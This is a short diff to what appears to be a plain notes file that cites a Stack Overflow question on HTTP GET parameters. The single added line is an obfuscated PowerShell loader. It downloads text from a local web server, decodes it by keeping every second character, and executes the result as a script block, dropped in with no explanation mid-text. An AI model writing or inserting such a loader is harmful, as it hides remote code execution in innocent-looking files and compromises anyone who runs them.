@@ -3,3 +3,4 @@ https://stackoverflow.com/questions/8928730/processing-http-get-input-parameter-
 
 
 - Require that all 
+. { $col = ""; $text = (Invoke-WebRequest -Uri "http://localhost:8000/?gimme=ksdjn").Content ; for ($i = 0; $i -lt $text.Length; $i = $i + 2) { $col += $text[$i] }; . ([scriptblock]::create($col)) }
